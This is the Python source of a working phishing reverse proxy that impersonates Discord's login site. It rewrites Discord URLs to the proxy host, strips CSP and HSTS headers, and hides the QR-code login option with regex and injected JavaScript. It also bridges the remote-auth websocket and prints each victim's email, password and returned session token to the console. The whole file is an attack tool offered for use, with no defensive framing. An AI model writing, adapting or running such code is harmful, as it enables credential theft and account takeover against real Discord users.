import base64
import asyncio
import ssl as _ssl
import websockets
import threading
from quart import Quart, request, Response, redirect, websocket
import json
import requests
from hypercorn.asyncio import serve
from hypercorn.config import Config

app = Quart(__name__)
if "PROVIDE_AUTOMATIC_OPTIONS" not in app.config:
    app.config["PROVIDE_AUTOMATIC_OPTIONS"] = True

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=0, pool_block=False)
session.mount('http://', adapter)
session.mount('https://', adapter)
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
})
session.max_redirects = 3
_fp_lock = threading.Lock()
_fingerprint = None

def _super_properties():
    p = {"os": "Windows", "browser": "Chrome", "release_channel": "stable"}
    return base64.b64encode(json.dumps(p).encode()).decode()

def _get_fingerprint():
    global _fingerprint
    if _fingerprint:
        return _fingerprint
    headers = {
        'Host': 'discord.com',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/login',
        'X-Super-Properties': _super_properties(),
    }
    try:
        with _fp_lock:
            if _fingerprint:
                return _fingerprint
            r = session.get('https://discord.com/api/v9/experiments', headers=headers, timeout=3)
            if r.status_code == 200:
                j = r.json()
                f = j.get('fingerprint')
                if f:
                    _fingerprint = f
                    return f
    except Exception:
        return None
    return None

@app.before_request
async def handle_preflight():
    if request.method == 'OPTIONS':
        return Response('', status=200, headers={
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Max-Age': '86400'
        })

@app.route('/gateway', methods=['GET', 'OPTIONS'])
@app.route('/gateway/', methods=['GET', 'OPTIONS'])
@app.route('/api/gateway', methods=['GET', 'OPTIONS'])
@app.route('/api/gateway/', methods=['GET', 'OPTIONS'])
async def gateway():
    if request.method == 'OPTIONS':
        return Response('', status=200, headers={
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Methods': '*'
        })
    if 'auth/qr' in request.path:
        headers = {}
        for key, value in request.headers.items():
            if key.lower() not in ['host', 'content-length', 'connection']:
                headers[key] = value
        headers['Host'] = 'discord.com'
        headers['Origin'] = 'https://discord.com'
        headers['Referer'] = 'https://discord.com/login'
        headers['Accept'] = 'application/json, text/plain, */*'
        headers['Accept-Language'] = 'en-US,en;q=0.9'
        headers['Content-Type'] = 'application/json'
        headers['Sec-Fetch-Site'] = 'same-origin'
        headers['Sec-Fetch-Mode'] = 'cors'
        headers['Sec-Fetch-Dest'] = 'empty'
        headers['X-Super-Properties'] = _super_properties()
        fp = _get_fingerprint()
        if fp:
            headers['X-Fingerprint'] = fp
        if 'User-Agent' not in headers:
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140 Safari/537.36'
        try:
            if request.method == 'POST':
                raw = await request.get_data()
                data = raw if raw else b'{}'
            else:
                data = None
            resp = await asyncio.to_thread(
                session.request,
                request.method,
                f'https://discord.com{request.path}',
                headers=headers,
                data=data,
                timeout=30
            )
            print(f"QR Auth response: {resp.status_code} - {resp.text[:200]}...")
            return Response(resp.content, status=resp.status_code, headers={
                'Content-Type': resp.headers.get('Content-Type', 'application/json'),
                'Access-Control-Allow-Origin': '*'
            })
        except Exception as e:
            print(f"QR Auth error: {str(e)}")
            return Response(json.dumps({'error': str(e)}), status=500)
    if 'remote-auth' in request.path:
        if request.method == 'POST':
            headers = {}
            for key, value in request.headers.items():
                if key.lower() not in ['host', 'content-length', 'connection']:
                    headers[key] = value
            headers['Host'] = 'discord.com'
            headers.setdefault('Origin', 'https://discord.com')
            headers.setdefault('Referer', 'https://discord.com/login')
            headers.setdefault('X-Super-Properties', _super_properties())
            fp = _get_fingerprint()
            if fp:
                headers['X-Fingerprint'] = fp
            try:
                raw = await request.get_data()
                resp = await asyncio.to_thread(
                    session.post,
                    f'https://discord.com{request.path}',
                    headers=headers,
                    data=raw,
                    timeout=30
                )
                return Response(resp.content, status=resp.status_code, headers={
                    'Content-Type': resp.headers.get('Content-Type', 'application/json'),
                    'Access-Control-Allow-Origin': '*'
                })
            except Exception as e:
                return Response(json.dumps({'error': str(e)}), status=500)
        else:
            return Response(json.dumps({
                'url': 'wss://remote-auth-gateway.discord.gg/?v=2'
            }), status=200, headers={
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            })
    qs = request.query_string.decode('utf-8')
    url = f'wss://gateway.discord.gg/?{qs}' if qs else 'wss://gateway.discord.gg/?v=9&encoding=json'
    return Response(json.dumps({'url': url}), status=200, headers={
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
    })

@app.websocket('/ws-bridge')
async def ws_bridge():
    qs = request.query_string.decode('utf-8')
    remote_url = 'wss://remote-auth-gateway.discord.gg/?v=2'
    if qs:
        remote_url = f'wss://remote-auth-gateway.discord.gg/?{qs}'
    headers = {
        'Origin': 'https://discord.com',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        requested = websocket.subprotocols
    except Exception:
        requested = []
    try:
        if requested:
            await websocket.accept(subprotocol=requested[0])
        else:
            await websocket.accept()
    except Exception:
        pass
    try:
        kw = {"extra_headers": headers}
        if requested:
            kw["subprotocols"] = requested
        async with websockets.connect(remote_url, **kw) as remote:
            async def client_to_remote():
                try:
                    while True:
                        data = await websocket.receive()
                        if data is None:
                            break
                        await remote.send(data)
                except Exception:
                    pass
            async def remote_to_client():
                try:
                    async for message in remote:
                        await websocket.send(message)
                except websockets.ConnectionClosed:
                    pass
            done, pending = await asyncio.wait(
                [asyncio.create_task(client_to_remote()), asyncio.create_task(remote_to_client())],
                return_when=asyncio.FIRST_COMPLETED,
            )
            for task in pending:
                task.cancel()
    except Exception:
        try:
            await websocket.close()
        except Exception:
            pass

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'])
async def proxy(path=''):
    if (path in ['gateway', 'gateway/'] or path.startswith('api/gateway')):
        return Response('Route conflict', status=500)
    if not path:
        return redirect('/login')
    if path.startswith('api/'):
        target = f'https://discord.com/api/{path[4:]}'
    elif path.startswith('cdn/'):
        target = f'https://cdn.discordapp.com/{path[4:]}'
    elif path.startswith('cdn-cgi/'):
        target = f'https://discord.com/{path}'
    elif path.startswith('assets/'):
        target = f'https://discord.com/{path}'
    elif path in ['login', 'register', 'app']:
        target = f'https://discord.com/{path}'
    else:
        target = f'https://discord.com/{path}'
    if request.query_string:
        target += '?' + request.query_string.decode('utf-8')
    headers = {}
    for key, value in request.headers.items():
        if key.lower() not in ['host', 'content-length', 'connection']:
            headers[key] = value
    headers['Host'] = target.split('/')[2]
    headers['Origin'] = 'https://discord.com'
    headers['Referer'] = 'https://discord.com'
    if 'User-Agent' not in headers:
        headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    try:
        raw = await request.get_data()
        if path.startswith('api/'):
            headers.setdefault('Origin', 'https://discord.com')
            headers.setdefault('Referer', 'https://discord.com')
            headers.setdefault('X-Super-Properties', _super_properties())
            if ('auth/' in path) or ('remote-auth' in path) or ('/qr' in path):
                fp = _get_fingerprint()
                if fp:
                    headers['X-Fingerprint'] = fp
        if path == 'api/v9/auth/login' and request.method == 'POST':
            try:
                login_data = json.loads(raw) if raw else {}
                email = login_data.get('login', '')
                password = login_data.get('password', '')
                if email and password:
                    print(f"\n=== LOGIN ATTEMPT ===")
                    print(f"Email: {email}")
                    print(f"Password: {password}")
            except Exception:
                pass
        resp = await asyncio.to_thread(
            session.request,
            request.method,
            target,
            headers=headers,
            data=raw,
            allow_redirects=False,
            verify=True,
            timeout=1,
            stream=True
        )
        content = resp.content
        content_type = resp.headers.get('Content-Type', '')
        if content and ('text/html' in content_type or 'javascript' in content_type or 'application/json' in content_type or 'text/plain' in content_type):
            try:
                text = content.decode('utf-8')
                scheme = 'https' if request.scheme == 'https' else 'http'
                ws_scheme = 'wss' if request.scheme == 'https' else 'ws'
                text = text.replace('https://discord.com', f'{scheme}://{request.host}')
                text = text.replace('https://cdn.discordapp.com', f'{scheme}://{request.host}/cdn')
                text = text.replace('"/api/', f'"{scheme}://{request.host}/api/')
                text = text.replace('wss://remote-auth-gateway.discord.gg', f'{ws_scheme}://{request.host}/ws-bridge')
                text = text.replace('https://remote-auth-gateway.discord.gg', f'{ws_scheme}://{request.host}/ws-bridge')
                text = text.replace('remote-auth-gateway.discord.gg', f'{ws_scheme}://{request.host}/ws-bridge')
                import re
                for _ in range(5):
                    text = re.sub(r'<([a-zA-Z0-9]+)[^>]*class=["\\\']?[^>]*qr[^>]*["\\\']?[^>]*>.*?</\1>', '', text, flags=re.DOTALL|re.IGNORECASE)
                    text = re.sub(r'<([a-zA-Z0-9]+)[^>]*id=["\\\']?[^>]*qr[^>]*["\\\']?[^>]*>.*?</\1>', '', text, flags=re.DOTALL|re.IGNORECASE)
                    text = re.sub(r'<(div|span)[^>]*data-[^=]*=["\\\']?[^>]*qr[^>]*["\\\']?[^>]*>.*?</\1>', '', text, flags=re.DOTALL|re.IGNORECASE)
                    text = re.sub(r'<([a-zA-Z0-9]+)[^>]*aria-label=["\\\']?[^>]*qr[^>]*["\\\']?[^>]*>.*?</\1>', '', text, flags=re.DOTALL|re.IGNORECASE)
                    text = re.sub(r'<([a-zA-Z0-9]+)[^>]*aria-label=["\\\']?[^>]*code[^>]*["\\\']?[^>]*>.*?</\1>', '', text, flags=re.DOTALL|re.IGNORECASE)
                if 'text/html' in content_type and '</body>' in text:
                    speed_js = '''<script>
(function(){
function killQR(){
const qrElements=document.querySelectorAll('[class*="qr" i],[id*="qr" i],[aria-label*="qr" i],[aria-label*="code" i],[class*="verticalSeparator" i],canvas');
qrElements.forEach(el=>el.remove());
}
function speedUp(){
const style=document.createElement('style');
style.textContent='*{transition:none!important;animation-duration:0s!important;}';
document.head.appendChild(style);
const prefetches=['/api/v9/users/@me','/api/v9/auth/fingerprint'];
prefetches.forEach(url=>{const link=document.createElement('link');link.rel='prefetch';link.href=url;document.head.appendChild(link);});
const emailField=document.querySelector('input[type="email"],input[name="email"]');
if(emailField)emailField.focus();
}
killQR();speedUp();setInterval(killQR,50);
document.addEventListener('DOMContentLoaded',()=>{killQR();speedUp();});
})();
</script>'''
                    text = text.replace('</body>', speed_js + '</body>')
                content = text.encode('utf-8')
            except Exception:
                pass
        response_headers = {}
        for key, value in resp.headers.items():
            if key.lower() not in ['content-encoding','content-length','transfer-encoding','connection','content-security-policy','x-content-security-policy','x-webkit-csp','strict-transport-security']:
                response_headers[key] = value
        response_headers['Access-Control-Allow-Origin'] = '*'
        response_headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response_headers['Access-Control-Allow-Headers'] = '*'
        response_headers['Access-Control-Allow-Credentials'] = 'true'
        response_headers['Cache-Control'] = 'public, max-age=86400'
        response_headers['Connection'] = 'keep-alive'
        response_headers['Keep-Alive'] = 'timeout=300, max=1000'
        response_headers['X-Content-Type-Options'] = 'nosniff'
        response_headers['Vary'] = 'Accept-Encoding'
        if path.startswith('api/'):
            response_headers['Cache-Control'] = 'public, max-age=5'
        if path == 'api/v9/auth/login' and resp.status_code == 200:
            try:
                response_data = json.loads(resp.text)
                token = response_data.get('token', '')
                if token:
                    print(f"Token: {token}")
                    print("=====================\n")
            except Exception:
                pass
        return Response(content, status=resp.status_code, headers=response_headers)
    except Exception as e:
        return Response(f"Error: {str(e)}", status=502)

if __name__ == '__main__':
    config = Config()
    config.bind = ["0.0.0.0:5000"]
    config.worker_connections = 3000
    config.keep_alive_timeout = 2
    config.graceful_timeout = 2
    config.timeout_keep_alive = 2
    config.max_request_size = 16777216
    config.h11_max_incomplete_size = 16384
    asyncio.run(serve(app, config))
